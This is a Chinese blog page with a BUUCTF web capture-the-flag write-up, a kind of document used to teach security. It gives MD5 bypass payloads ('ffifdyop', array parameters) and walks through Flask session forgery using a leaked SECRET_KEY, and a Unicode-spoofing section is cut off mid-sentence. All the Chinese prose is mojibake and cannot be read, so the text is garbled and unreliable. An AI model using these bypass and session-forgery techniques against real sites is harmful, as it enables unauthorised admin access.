<script>"serviceWorker"in navigator&&window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})).them((()=>{"true"!=window.localStorage.getItem("install")&&(window.localStorage.setItem("install","true"),location.reload())}))</script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2 | h-t-m</title><meta name="keywords" content="ç½‘ç»œå®‰å…¨,BUUCTF,Web"><meta name="author" content="h-t-m"><meta name="copyright" content="h-t-m"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ç»§ç»­ Web åˆ·é¢˜ï¼"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2"><meta property="og:url" content="https://h-t-m.top/posts/de7d7276/"><meta property="og:site_name" content="h-t-m"><meta property="og:description" content="ç»§ç»­ Web åˆ·é¢˜ï¼"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp"><meta property="article:published_time" content="2022-11-08T07:39:23.000Z"><meta property="article:modified_time" content="2022-11-19T10:03:57.548Z"><meta property="article:author" content="h-t-m"><meta property="article:tag" content="ç½‘ç»œå®‰å…¨"><meta property="article:tag" content="BUUCTF"><meta property="article:tag" content="Web"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp"><link rel="shortcut icon" href="/images/~logo.gif"><link rel="canonical" href="https://h-t-m.top/posts/de7d7276/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//s4.cnzz.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="#132c33"><link rel="apple-touch-icon" sizes="180x180" href="/logo/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/logo/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/logo/favicon-16x16.png"><link rel="mask-icon" href="/logo/safari-pinned-tab.svg" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?2b93c7896a6f4dc63301e461b14f5b59";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-214297516-1"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-214297516-1")</script><script async data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=1280663206&amp;web_id=1280663206"></script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"å¤åˆ¶æˆåŠŸ",error:"å¤åˆ¶é”™è¯¯",noSupport:"æµè§ˆå™¨ä¸æ”¯æŒ"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"åˆšåˆš",min:"åˆ†é’Ÿå‰",hour:"å°æ—¶å‰",day:"å¤©å‰",month:"ä¸ªæœˆå‰"},copyright:{limitCount:50,languages:{author:"ä½œè€…: h-t-m",link:"é“¾æ¥: ",source:"æ¥æº: h-t-m",info:"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"ä½ å·²åˆ‡æ¢ä¸ºç¹ä½“",cht_to_chs:"ä½ å·²åˆ‡æ¢ä¸ºç®€ä½“",day_to_night:"ä½ å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼",night_to_day:"ä½ å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼",bgLight:"#49b1f5",bgDark:"#121212",position:"bottom-left"},source:{jQuery:"https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://npm.elemecdn.com/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://npm.elemecdn.com/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!0,islazyload:!1,isanchor:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2022-11-19 18:03:57"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme"),o=(new Date).getHours();void 0===t?o<=6||o>=18?activateDarkMode():activateLightMode():"light"===t?activateLightMode():activateDarkMode();const n=saveToLocal.get("aside-status");void 0!==n&&("hide"===n?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const a=saveToLocal.get("global-font-size");void 0!==a&&document.documentElement.style.setProperty("--global-font-size",a+"px");const c=()=>{GLOBAL_CONFIG_SITE.isHome&&/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")};c(),document.addEventListener("pjax:complete",c)})(window)</script><link rel="stylesheet" href="/css/copyright.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/font-awesome-animation.min.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/tag_plugins.css" media="defer" onload='this.media="all"'><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/carousel-touch.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading()" title="ç‚¹å‡»è·³è¿‡åŠ¨ç”»"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><img class="load-image" src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif" alt=""></div></a><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/logo.jpg" onerror='onerror=null,src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">28</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">56</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">17</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>æ‰€æœ‰æ–‡ç« </span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>å½’æ¡£</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>çè—</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>éŸ³ä¹</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>ç›¸å†Œ</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>ç”µå½±</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>ç¤¾äº¤</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>é“¾æ¥</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>ç•™è¨€æ¿</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>è¯´è¯´</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>æœ‹å‹åœˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>å…³äº</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>æˆ‘</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>å¥¹</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>æˆ‘ä»¬</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url('https://pic.h-t-m.ltd/img/BUUCTF-top.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h-t-m</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-campground"></i> <span>æ‰€æœ‰æ–‡ç« </span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>å½’æ¡£</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>åˆ†ç±»</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i> <span>çè—</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i> <span>éŸ³ä¹</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i> <span>ç›¸å†Œ</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i> <span>ç”µå½±</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-flag"></i> <span>ç¤¾äº¤</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>é“¾æ¥</span></a></li><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-inbox"></i> <span>ç•™è¨€æ¿</span></a></li><li><a class="site-page child" href="/bb/"><i class="fa-fw fas fa-fish"></i> <span>è¯´è¯´</span></a></li><li><a class="site-page child" href="/fcircle/"><i class="fa-fw fas fa-fan"></i> <span>æœ‹å‹åœˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i> <span>å…³äº</span><i class="fas fa-chevron-down expand hide"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/me/"><i class="fa-fw fas fa-skiing"></i> <span>æˆ‘</span></a></li><li><a class="site-page child" href="/her/"><i class="fa-fw fas fa-kiss-wink-heart"></i> <span>å¥¹</span></a></li><li><a class="site-page child" href="/we/"><i class="fa-fw fas fa-award"></i> <span>æˆ‘ä»¬</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2022-11-08T07:39:23.000Z" title="å‘è¡¨äº 2022-11-08 15:39:23">2022-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2022-11-19T10:03:57.548Z" title="æ›´æ–°äº 2022-11-19 18:03:57">2022-11-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">ç¬”è®°</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/CTF/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">11.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>41åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>BUUCTF åˆ·é¢˜ç¬”è®°â€”â€”Web 2</h1><h2 id="BJDCTF2020-Easy-MD5">[BJDCTF2020]Easy MD5</h2><ul><li><p>æ‰“å¼€é¶æœºï¼Œé¡µé¢ä¸­ä»…æœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œæäº¤ä¸€ä¸ªæ•°æ®å‘ç°å…¶å°†æ•°æ®ä½¿ç”¨ GET æ–¹æ³•ä¼ ç»™å˜é‡ <kbd>password</kbd>ã€‚</p><img src="0001.webp" alt="" style="zoom:75%"></li><li><p>åœ¨å‡ æ¬¡æµ‹è¯•åç½‘é¡µå¹¶æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œå› æ­¤ <kbd>F12</kbd> æ£€æŸ¥ä¸€ä¸‹ï¼Œå‘ç°åœ¨å“åº”å¤´ä¸­å«æœ‰ä¸€ä¸ªç‰¹æ®Šå­—æ®µ <kbd>hint</kbd>ï¼Œå†…å®¹ä¸ºä¸€ä¸ª SQL è¯­å¥ï¼Œæç¤ºæ•°æ®ä¼ å…¥åä¼šè¿›è¡Œ MD5 åŠ å¯†ã€‚å¯ä»¥ä¼ å…¥å­—ç¬¦ä¸² <kbd>ffifdyop</kbd> è¿›è¡Œç»•è¿‡ï¼Œè¯¥å­—ç¬¦ä¸²å“ˆå¸Œä¹‹åå‰å‡ ä½æ­£å¥½æ„æˆæ°¸çœŸå¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure></li><li><p>ç»•è¿‡åç½‘é¡µè·³è½¬åˆ° <kbd>/levels91.php</kbd>ï¼Œä»…æ˜¾ç¤ºä¸€å¥è¯ï¼Œä½†æ˜¯è°ƒè¯•ç•Œé¢å¯ä»¥çœ‹åˆ°ä¸€ä¸²è¢«æ³¨é‡Šçš„ä»£ç ã€‚</p><img src="0002.webp" alt="" style="zoom:75%"><p>ä»£ç æç¤ºè¯¥é¡µé¢é€šè¿‡ GET æ–¹æ³•è·å–å˜é‡ <kbd>a</kbd> å’Œ <kbd>b</kbd>ï¼Œä»…åœ¨ <kbd>a</kbd> ä¸ç­‰äº <kbd>b</kbd> ä½†åŒæ—¶ MD5 å€¼åˆç›¸åŒçš„æ‰è¡Œã€‚è¿™å°±å¾ˆç†Ÿäº†ï¼Œç›´æ¥æ•°ç»„ç»•è¿‡ï¼Œ<kbd>payload</kbd> å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></li><li><p>éšåç½‘é¡µè·³è½¬åˆ°å¦ä¸€ä¸ªæ–‡ä»¶å¹¶ä¸”æ˜¾ç¤ºäº†å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬æ¬¡ä¾ç„¶æ˜¯è¦ä¸¤ä¸ªå‚æ•°ä¸ç›¸ç­‰ä¸” MD5 å€¼åˆç›¸ç­‰ï¼Œä¸è¿‡ä¼ é€’æ–¹å¼å˜æˆäº† POSTï¼Œæ¯”è¾ƒæ–¹å¼ä¹Ÿæ¢æˆäº†å¼ºç­‰äºã€‚å¼ºç­‰äºä¸ä¼šåœ¨æ¯”è¾ƒå‰å¯¹æ•°æ®ç±»å‹è¿›è¡Œè½¬æ¢ï¼Œè€Œä¸Šè¿°æ–¹æ³•å¹¶ä¸æ¶‰åŠæ•°æ®è½¬æ¢ï¼Œå› æ­¤ä½¿ç”¨å¦‚ä¸‹ <kbd>payload</kbd> å³å¯ç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure></li></ul><h2 id="HCTF-2018-admin">[HCTF 2018]admin</h2><ul><li><p>æ‰“å¼€é¶æœºï¼Œç½‘é¡µåŒ…å«äº†ç™»å½•ä¸æ³¨å†Œä¸¤ä¸ªåŠŸèƒ½ï¼ŒLOGO å¤„å¯ä»¥ç‚¹å‡»ï¼Œä½†æ˜¯ä¼šè¿”å› <kbd>404</kbd>ã€‚</p><img src="0003.webp" alt="" style="zoom:75%"></li><li><p>æ ‡é¢˜æç¤ºè‚¯å®šéœ€è¦ <kbd>admin</kbd>ï¼Œè¿™é‡Œå°±ä¸çŒœä»–çš„å¯†ç äº†ï¼Œ<psw>ç´§æ€¥æ’­æŠ¥ï¼Œå¯å¼±å£ä»¤ 123 ç›´æ¥ç™»å…¥æ‹¿åˆ° flag</psw>ã€‚å…ˆæ³¨å†Œä¸€ä¸‹æ‘¸æ‘¸ç½‘ç«™åŠŸèƒ½ï¼Œæ³¨å†Œç™»å½•åç½‘é¡µæœ‰äº†ç¼–è¾‘ã€ä¿®æ”¹å¯†ç ä»¥åŠç™»å‡ºåŠŸèƒ½ã€‚</p><img src="0004.webp" alt="" style="zoom:75%"><p>ç¬”è€…å¹¶æ²¡èƒ½åœ¨è¿™äº›åŠŸèƒ½ä¸Šæ‰¾åˆ°çªç ´ç‚¹ï¼Œä¸è¿‡ï¼Œåœ¨æ›´æ¢å¯†ç ç•Œé¢çš„æ³¨é‡Šä¸­åŒ…å«äº†ä¸€ä¸ª <a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/">GitHub çš„ä»“åº“åœ°å€</a>ï¼Œç›®æµ‹åº”è¯¥æ˜¯ç½‘ç«™çš„æºç ã€‚</p><img src="0005.webp" alt="" style="zoom:75%"></li></ul><h3 id="flask-session-ä¼ªé€ ">flask session ä¼ªé€ </h3><ul><li><p>ç”±äºç¬”è€…å¯¹ <kbd>flask</kbd> å®Œå…¨éƒ¨ç½²ï¼Œå› æ­¤åªèƒ½å°†æ•´ä¸ªç›®å½•æ‹–è¿› VS Code ä¸­æ£€ç´¢å…³é”®å­—ï¼Œå‘ç°é¦–é¡µä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦èƒ½ä¼ªé€  <kbd>name</kbd> å­—æ®µä¸º <kbd>admin</kbd> çš„ <kbd>session</kbd> å³å¯ã€‚</p></li><li><kbd>session</kbd> è¢«è®¾è®¡ä¸ºå¯è¯»å–ä½†æ˜¯ä¸å¯ä¿®æ”¹ï¼ŒæœåŠ¡å™¨ä¼šå¯¹è¯¥æ•°æ®è¿›è¡Œç­¾åï¼Œæ•°æ®æ ¼å¼æˆ‘ä»¬å¯ä»¥è§£å¯†ç°æœ‰ <kbd>session</kbd>ï¼Œè€Œå¯¹æ•°æ®ç­¾åè¿˜éœ€è¦ <kbd>SECRET_KEY</kbd>ï¼Œè¯¥å€¼ä¸€èˆ¬ç”±åå°éšæœºç”Ÿæˆï¼Œè¯¥é…ç½®ä½äº <kbd>config.py</kbd> æ–‡ä»¶ä¸­ã€‚å®æµ‹è¢«å›ºå®šä¸ºäº† <kbd>ckj123</kbd>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ‹¿æ¥ç›´æ¥ç­¾ã€‚<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure></li><li><p>ä¼ªé€ å·¥ä½œå¯ä»¥å€ŸåŠ© <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager</a> æ¥å®Œæˆï¼Œè¯»å–å‡ºçš„æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</p><img src="0007.webp" alt="" style="zoom:75%"><p>å°†ç”¨æˆ·åä¿®æ”¹ä¸º <kbd>admin</kbd> å¹¶åŠ ä¸Š <kbd>ckj123</kbd> åŠ å¯†ä¸€éä¾¿ä¼ªé€ å®Œæˆäº†ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯æ•°æ®å†…å®¹åŸæœ¬å‡ä¸ºåŒå¼•å·åŒ…è£¹ï¼Œè€Œä½œä¸ºå‚æ•°å†æ¬¡è¢«åŒå¼•å·åŒ…è£¹ä¾¿ä¼šæ··æ·†ï¼Œå› æ­¤è¿™é‡Œå°†å„éƒ¨åˆ†æ•°æ®ä¿®æ”¹ä¸ºå•å¼•å·åŒ…è£¹ã€‚</p><img src="0008.webp" alt="" style="zoom:75%"></li><li><p>å°†ä¸Šè¿°ä¼ªé€ çš„ <kbd>session</kbd> æ’å…¥æ•°æ®æŠ¥ä¸­çš„ç›¸åº”ä½ç½®ä¹‹åå‘åŒ…å³å¯è¢«è¯†åˆ«ä¸º <kbd>admin</kbd>ï¼Œ<kbd>flag</kbd> ä¾¿åˆ°æ‰‹äº†ã€‚</p><img src="0006.webp" alt="" style="zoom:75%"></li></ul><h3 id="Unicode-æ¬ºéª—">Unicode æ¬ºéª—</h3><ul><li><p>æœ¬é¢˜è¿˜æœ‰ä¸€ä¸ªæœ‰æ„æ€çš„è§£æ³•ï¼Œåœ¨åˆæœŸæµ‹è¯•æ—¶ä¼šå‘ç°å¤§å†™å­—æ¯ç‰ˆçš„ <kbd>ADMIN</kbd> ç…§æ ·ä¸èƒ½æ³¨å†Œï¼Œè¿™æ˜¯å› ä¸ºåå°åšäº†å¤§å°å†™è¿‡æ»¤ã€‚å®¡è®¡ä»£ç å¯çŸ¥è¯¥æ“ä½œå…·ä½“ç”± <kbd>nodeprep.prepare</kbd> å‡½æ•°å°†å­—æ¯ç»Ÿä¸€è½¬æ¢ä¸ºå°å†™æ¥å®Œæˆï¼Œè€Œæ—§ç‰ˆæœ¬çš„è¯¥å‡½æ•°å­˜åœ¨ä¸€ä¸ªæœ‰æ„æ€çš„æ¼æ´ï¼Œå…¶ä¸ä»…ä¼šå°†å¤§å†™å­—æ¯è½¬æ¢ä¸ºå°å†™å­—æ¯ï¼Œè¿˜ä¼šå°†å¥‡å¥‡æ€ªæ€ªçš„ Unicode å­—ç¬¦ <kbd>á´¬á´°á´¹á´µá´º</kbd> ç­‰è½¬æ¢ä¸ºå¤§å†™å­—æ¯ 